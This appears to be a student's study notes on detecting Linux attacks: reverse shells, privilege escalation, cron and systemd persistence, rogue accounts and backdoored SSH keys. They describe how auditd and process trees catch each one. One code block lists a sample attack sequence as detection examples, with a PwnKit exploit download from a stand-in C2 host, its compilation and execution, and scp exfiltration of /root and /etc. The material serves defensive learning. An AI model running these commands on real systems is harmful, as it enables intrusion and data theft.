---
title: Linux Threat Detection 3
updated: 2026-03-07 07:25:17Z
created: 2026-03-06 14:11:58Z
latitude: 21.02776440
longitude: 105.83415980
altitude: 0.0000
---

# <span style="color: rgb(241, 196, 15);">Reverse Shells</span>

- a session from the victim to the attacker.
- more convinient and often the only possible action to continue the attack.
- 3 method example to open a reverse shell on Linux:
- ![21b56b88d4ca46ed101f37f18175bcc3.png](../../../_resources/21b56b88d4ca46ed101f37f18175bcc3.png)

## Detecting Reverse shells

- ![e6bbf75a5d751e711309978be62d1d5d.png](../../../_resources/e6bbf75a5d751e711309978be62d1d5d.png)
- list all commands originating from the spawned reverse shell by building process tree.
- ![d86586eba56d23d8b477c8f5244ea6ac.png](../../../_resources/d86586eba56d23d8b477c8f5244ea6ac.png)

# <span style="color: rgb(241, 196, 15);">Privilege Escalation</span>

to get the root user, attackers may:

![85a2e0b87bc82f35b3d237af3ee9d6aa.png](../../../_resources/85a2e0b87bc82f35b3d237af3ee9d6aa.png)

## Detecting Privilege Escaltion

three steps: Discovery, Privilege Escalation, Exfiltration:

```bash
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```

confirm whether privilege escalation succed by comparing the different of UID before and after doing suspicious activities.

<img src="../../../_resources/524e3ee7e9bbab42269edec1b43cffea.png" alt="524e3ee7e9bbab42269edec1b43cffea.png" width="1082" height="288" class="jop-noMdConv">

## Practice

1.  which command line was used to look for the "pass" in files.![43a12db0e98864e79275fb4f89b50f1b.png](../../../_resources/43a12db0e98864e79275fb4f89b50f1b.png)
2.  which commad line was used to escalate to root? : `su root`

# <span style="color: rgb(241, 196, 15);">Startup Persistence</span>

## Cron Persistence

- the simplest way to run a process schedule.
- the most ubiquitous persistence method.
- added a new line to the victim's cron job file, located at `/var/spool/cron/<user>`
- ![b4757b6902f5a28218446282596430f9.png](../../../_resources/b4757b6902f5a28218446282596430f9.png)
- ![d08877fd20eeab86874e7fed5b35507f.png](../../../_resources/d08877fd20eeab86874e7fed5b35507f.png)

## Systemd Persistence

- service files located at /lib/systemd/system or /etc/systemd/system folders.
- threat actors created a "cloud-online" service to enable its GOGETTER malware to run on reboot.
- ![d087b52e00fb50cde6b0894f52c0eb6a.png](../../../_resources/d087b52e00fb50cde6b0894f52c0eb6a.png)

## Detecting Persistence

- both cron jobs and systemd service are defined as simple text files,
- so  we can monitor them by auditd.
- can be detected by tracking the creation of related processes (<span style="color: rgb(241, 196, 15);">**crobtab**</span> | <span style="color: rgb(241, 196, 15);">**systemctl**</span>)
- ![8e265ff65ff13a00d4c5b18e66e55a32.png](../../../_resources/8e265ff65ff13a00d4c5b18e66e55a32.png)
- Detecting persistence with auditd
- ![aff877e3d56dddf0056b2ca79403c5f7.png](../../../_resources/aff877e3d56dddf0056b2ca79403c5f7.png)

# <span style="color: rgb(241, 196, 15);">Account Persistence</span>

## New User Account

- when an SSH is exposed, attackers may create a new user account and add it to privilege group for futher SSH login.
- detection:
- track the user creation events --> reconstruct process tree with auditd.
- ![23430784cef14b3550c84cad491047c3.png](../../../_resources/23430784cef14b3550c84cad491047c3.png)

## Backdoored SSH keys

- backdoor the malicious SSH keys of a user and use them for future logins instead of password.
- this is so difficult to regconize because of blending between legitimate and malicious SSH keys.
- ![dcff5b4ecf63afdd1f7f7e5d5e1af60b.png](../../../_resources/dcff5b4ecf63afdd1f7f7e5d5e1af60b.png)
- authorized SSH keys are stored in each user's `~/.ssh/authorized_keys` file.
- detection method is monitor changes of these files using auditd.
- ![39a36edc317124aee444d308347dc0f4.png](../../../_resources/39a36edc317124aee444d308347dc0f4.png)

## <span style="color: rgb(255, 255, 255);">Application Persistence</span>

# ![3f41a3d5d86766c096416cffe17c8d0e.png](../../../_resources/3f41a3d5d86766c096416cffe17c8d0e.png)  Targeted Attack

## Linux as Entry Point

- linux machines are deployed commonly as firewalls, webservers, mail servers, or other public-facing services.
- ![e5baf9cb569ab4163fe4f4015b0914ac.png](../../../_resources/e5baf9cb569ab4163fe4f4015b0914ac.png)

## Linux in espionage

- Linux machines can be stored mission-critial data / network and thus are often targeted by state-sponsored threat groups.
- use systemd persistence.
- ![668922a71f13fb9bc291951de1222ff2.png](../../../_resources/668922a71f13fb9bc291951de1222ff2.png)

## Linux in ransomware

- hypervisors (hundreds of Windows VMs run on serveral physical Linux Servers): is a primary target.
- ![6acc18723192f1921ccc7af552f1f749.png](../../../_resources/6acc18723192f1921ccc7af552f1f749.png)

## Threat Detection Recap

![badf17aa5e5eaea43c4ec98ce65bbaaf.png](../../../_resources/badf17aa5e5eaea43c4ec98ce65bbaaf.png)